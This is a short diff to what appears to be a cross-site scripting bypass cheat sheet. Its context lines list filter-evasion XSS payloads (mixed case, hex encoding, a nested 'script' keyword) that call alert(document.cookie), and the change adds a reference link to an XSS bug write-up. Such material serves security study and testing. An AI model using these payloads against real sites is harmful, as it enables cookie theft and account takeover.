@@ -27,3 +27,7 @@ summary: ""
 * Change case: `"><ScRiPt>alert(document.cookie)</ScRiPt>"`
 * Hex encoding: `"%3e%3cscript%3ealert(document.cookie)%3c/script%3e"`
 * Double `script` keyword: `"><scr<script>ipt>alert(document.cookie)</scr</script>ipt>"`
+
+
+## Resources and references
+* [Example of finding an XSS bug](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff)
